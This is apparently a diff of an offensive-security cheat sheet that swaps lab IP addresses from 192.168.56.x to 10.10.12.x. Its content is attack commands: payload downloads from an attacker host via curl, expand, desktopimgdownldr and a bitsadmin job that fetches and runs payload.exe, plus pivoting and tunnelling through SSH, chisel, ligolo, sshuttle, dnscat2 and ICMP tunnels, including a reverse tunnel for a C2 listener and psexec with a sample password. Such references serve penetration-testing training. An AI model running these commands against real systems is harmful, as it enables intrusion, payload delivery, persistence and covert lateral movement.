-curl http://192.168.56.100/file.exe -o file.exe
+curl http://10.10.12.100/file.exe -o file.exe
 
 # Expand
-expand http://192.168.56.100/file.zip C:\file.exe
+expand http://10.10.12.100/file.zip C:\file.exe
 
 # Desktopimgdownldr
-desktopimgdownldr.exe /lockscreenurl:http://192.168.56.100/file.exe /o:C:\file.exe
+desktopimgdownldr.exe /lockscreenurl:http://10.10.12.100/file.exe /o:C:\file.exe
 ```
 
 ## Compile/Execute
@@ -1553,7 +1578,7 @@ reg add "HKCU\SOFTWARE\Classes\CLSID\{GUID}\InprocServer32" /ve /t REG_SZ /d "C:
 
 ```powershell
 bitsadmin /create evil
-bitsadmin /addfile evil http://192.168.56.100/payload.exe C:\Windows\Temp\payload.exe
+bitsadmin /addfile evil http://10.10.12.100/payload.exe C:\Windows\Temp\payload.exe
 bitsadmin /SetNotifyCmdLine evil C:\Windows\Temp\payload.exe NUL
 bitsadmin /SetMinRetryDelay evil 60
 bitsadmin /resume evil
@@ -1894,9 +1919,9 @@ Pivoting is using a compromised host to access other networks or systems that ar
 ┌──────────┐                    ┌──────────┐                    ┌──────────┐
 │ Attacker │    Accessible      │  Pivot   │   Internal Only    │  Target  │
 │   Kali   │ ─────────────────> │   Host   │ ─────────────────> │  Server  │
-│          │   192.168.56.x     │  (WS01)  │    10.10.10.x      │   (DB)   │
+│          │   10.10.12.x     │  (WS01)  │    10.10.10.x      │   (DB)   │
 └──────────┘                    └──────────┘                    └──────────┘
-192.168.56.100                  192.168.56.11                   10.10.10.50
+10.10.12.100                  10.10.12.11                   10.10.10.50
                                 10.10.10.11
                                     │
                                     │  Pivot through WS01
@@ -1929,16 +1954,16 @@ Forward a local port through the pivot to reach an internal target.
 # Syntax: ssh -L [local_port]:[target_host]:[target_port] user@pivot_host
 
 # Forward local port 8080 to internal server 10.10.10.50:80 via pivot
-ssh -L 8080:10.10.10.50:80 user@192.168.56.11
+ssh -L 8080:10.10.10.50:80 user@10.10.12.11
 
 # Now access http://localhost:8080 to reach internal server
 
 # Forward local 3389 to internal RDP server
-ssh -L 3389:10.10.10.50:3389 user@192.168.56.11
+ssh -L 3389:10.10.10.50:3389 user@10.10.12.11
 # Connect: rdesktop localhost
 
 # Multiple forwards
-ssh -L 8080:10.10.10.50:80 -L 3389:10.10.10.50:3389 user@192.168.56.11
+ssh -L 8080:10.10.10.50:80 -L 3389:10.10.10.50:3389 user@10.10.12.11
 ```
 
 ### Remote Port Forwarding
@@ -1948,12 +1973,12 @@ Make a port on the pivot accessible from your attacker machine (reverse tunnel).
 # Syntax: ssh -R [remote_port]:[local_host]:[local_port] user@pivot_host
 
 # From compromised pivot, expose attacker's port 8080 on pivot's port 9999
-ssh -R 9999:localhost:8080 attacker@192.168.56.100
+ssh -R 9999:localhost:8080 attacker@10.10.12.100
 
 # Now internal machines can reach attacker:8080 via pivot:9999
 
 # Expose attacker's C2 listener on pivot
-ssh -R 4444:localhost:4444 attacker@192.168.56.100
+ssh -R 4444:localhost:4444 attacker@10.10.12.100
 # Internal victims connect to pivot:4444, traffic routes to attacker:4444
 ```
 
@@ -1964,7 +1989,7 @@ Create a SOCKS proxy for flexible routing through the pivot.
 # Syntax: ssh -D [local_port] user@pivot_host
 
 # Create SOCKS5 proxy on local port 1080
-ssh -D 1080 user@192.168.56.11
+ssh -D 1080 user@10.10.12.11
 
 # Use with proxychains
 # Edit /etc/proxychains4.conf:
@@ -1980,14 +2005,14 @@ proxychains evil-winrm -i 10.10.10.50 -u admin -p 'Password123!'
 ### SSH Options for Pivoting
 ```bash
 # Background the tunnel
-ssh -f -N -D 1080 user@192.168.56.11
+ssh -f -N -D 1080 user@10.10.12.11
 
 # -f : Background after authentication
 # -N : No command execution (just tunnel)
 # -T : Disable pseudo-terminal allocation
 
 # Keep tunnel alive
-ssh -o ServerAliveInterval=60 -D 1080 user@192.168.56.11
+ssh -o ServerAliveInterval=60 -D 1080 user@10.10.12.11
 
 # Through jump host (ProxyJump)
 ssh -J user@jumphost user@internal_target
@@ -2017,15 +2042,15 @@ Chisel creates TCP tunnels over HTTP, useful for bypassing firewalls.
 **On Pivot (Client Mode)**
 ```bash
 # Reverse SOCKS proxy (most common)
-./chisel client 192.168.56.100:8080 R:socks
+./chisel client 10.10.12.100:8080 R:socks
 
 # Now attacker has SOCKS5 on localhost:1080
 
 # Reverse port forward
-./chisel client 192.168.56.100:8080 R:4444:10.10.10.50:445
+./chisel client 10.10.12.100:8080 R:4444:10.10.10.50:445
 
 # Forward local port (less common)
-./chisel client 192.168.56.100:8080 8888:10.10.10.50:80
+./chisel client 10.10.12.100:8080 8888:10.10.10.50:80
 ```
 
 ### Usage with Proxychains
@@ -2042,10 +2067,10 @@ proxychains impacket-psexec admin:'Password123!'@10.10.10.50
 ### Windows Chisel
 ```powershell
 # On Windows pivot
-.\chisel.exe client 192.168.56.100:8080 R:socks
+.\chisel.exe client 10.10.12.100:8080 R:socks
 
 # With authentication
-.\chisel.exe client --auth user:password 192.168.56.100:8080 R:socks
+.\chisel.exe client --auth user:password 10.10.12.100:8080 R:socks
 ```
 
 ---
@@ -2078,10 +2103,10 @@ sudo ip route add 10.10.10.0/24 dev ligolo
 **On Pivot (Agent)**
 ```bash
 # Linux
-./agent -connect 192.168.56.100:11601 -ignore-cert
+./agent -connect 10.10.12.100:11601 -ignore-cert
 
 # Windows
-.\agent.exe -connect 192.168.56.100:11601 -ignore-cert
+.\agent.exe -connect 10.10.12.100:11601 -ignore-cert
 ```
 
 ### Usage
@@ -2152,7 +2177,7 @@ meterpreter > portfwd flush  # Delete all
 
 ### Double Pivot Example
 ```bash
-# Session 1: Pivot1 (192.168.56.11)
+# Session 1: Pivot1 (10.10.12.11)
 # Session 2: Pivot2 (10.10.10.50) - obtained through pivot1
 
 # Route through both
@@ -2194,22 +2219,22 @@ netsh advfirewall firewall delete rule name="Forward 8080"
 ```powershell
 # If OpenSSH is installed (Win10+)
 # Dynamic SOCKS proxy
-ssh -D 1080 user@192.168.56.100
+ssh -D 1080 user@10.10.12.100
 
 # Local forward
-ssh -L 8080:10.10.10.50:80 user@192.168.56.100
+ssh -L 8080:10.10.10.50:80 user@10.10.12.100
 ```
 
 ### Plink (PuTTY CLI)
 ```powershell
 # Dynamic SOCKS
-plink.exe -D 1080 user@192.168.56.100
+plink.exe -D 1080 user@10.10.12.100
 
 # Local forward
-plink.exe -L 8080:10.10.10.50:80 user@192.168.56.100
+plink.exe -L 8080:10.10.10.50:80 user@10.10.12.100
 
 # Remote forward
-plink.exe -R 4444:127.0.0.1:4444 user@192.168.56.100
+plink.exe -R 4444:127.0.0.1:4444 user@10.10.12.100
 ```
 
 ---
@@ -2306,22 +2331,22 @@ sshuttle creates a VPN-like connection over SSH without requiring root on the pi
 ### Usage
 ```bash
 # Basic - route all traffic to subnet through pivot
-sshuttle -r user@192.168.56.11 10.10.10.0/24
+sshuttle -r user@10.10.12.11 10.10.10.0/24
 
 # Multiple subnets
-sshuttle -r user@192.168.56.11 10.10.10.0/24 172.16.0.0/16
+sshuttle -r user@10.10.12.11 10.10.10.0/24 172.16.0.0/16
 
 # All traffic (be careful!)
-sshuttle -r user@192.168.56.11 0/0
+sshuttle -r user@10.10.12.11 0/0
 
 # Exclude certain hosts
-sshuttle -r user@192.168.56.11 10.10.10.0/24 -x 10.10.10.1
+sshuttle -r user@10.10.12.11 10.10.10.0/24 -x 10.10.10.1
 
 # DNS through tunnel
-sshuttle --dns -r user@192.168.56.11 10.10.10.0/24
+sshuttle --dns -r user@10.10.12.11 10.10.10.0/24
 
 # Verbose
-sshuttle -vvr user@192.168.56.11 10.10.10.0/24
+sshuttle -vvr user@10.10.12.11 10.10.10.0/24
 ```
 
 ### After sshuttle
@@ -2349,10 +2374,10 @@ python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-port 1080
 **On Pivot**
 ```bash
 # Linux
-python client.py --server-ip 192.168.56.100 --server-port 9999
+python client.py --server-ip 10.10.12.100 --server-port 9999
 
 # Windows
-python client.py --server-ip 192.168.56.100 --server-port 9999
+python client.py --server-ip 10.10.12.100 --server-port 9999
 ```
 
 ### Usage
@@ -2382,10 +2407,10 @@ ruby dnscat2.rb --dns "host=0.0.0.0,port=53" --no-cache
 **On Pivot**
 ```bash
 # Linux
-./dnscat --dns server=192.168.56.100
+./dnscat --dns server=10.10.12.100
 
 # Windows
-dnscat2.exe --dns server=192.168.56.100
+dnscat2.exe --dns server=10.10.12.100
 
 # With domain
 ./dnscat tunnel.attacker.com
@@ -2410,7 +2435,7 @@ command> listen 8080 10.10.10.50:80  # Port forward
 ./icmptunnel -s
 
 # On pivot (client)
-./icmptunnel 192.168.56.100
+./icmptunnel 10.10.12.100
 
 # Creates tunnel interface for traffic
 ```
@@ -2418,10 +2443,10 @@ command> listen 8080 10.10.10.50:80  # Port forward
 ### ptunnel-ng
 ```bash
 # Server (attacker)
-ptunnel-ng -r192.168.56.100 -R22
+ptunnel-ng -r10.10.12.100 -R22
 
 # Client (pivot) - forward SSH through ICMP
-ptunnel-ng -p192.168.56.100 -l2222 -r10.10.10.50 -R22
+ptunnel-ng -p10.10.12.100 -l2222 -r10.10.10.50 -R22
 
 # Connect to local port
 ssh -p 2222 user@localhost
